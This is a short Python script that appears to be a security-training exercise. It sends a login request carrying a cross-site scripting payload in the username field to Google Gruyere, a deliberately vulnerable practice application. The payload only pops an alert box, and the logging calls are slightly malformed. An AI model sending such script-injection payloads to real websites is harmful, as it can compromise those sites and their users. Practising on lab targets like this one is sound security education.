import logging

import requests

logger = logging.getLogger(__name__)

HTTP = 'http://google-gruyere.appspot.com/<your id>/login'


def send_xss_via_requests() -> str:
    """
    отправка запроса с XSS инъекцией через Requests
    :return: ответ от запроса
    """
    data_payload = {
        "uid": '<script>eval("alert(\'XSS\')")</script>',
        "pw": "P@ssw0rd"
    }
    response = requests.post(HTTP, data=data_payload)
    logger.info("Статус-код:", response.status_code)
    logger.info("Ответ сервера:", response.url)
    return response.text if response else "No response received"


if __name__ == '__main__':
    send_xss_via_requests()
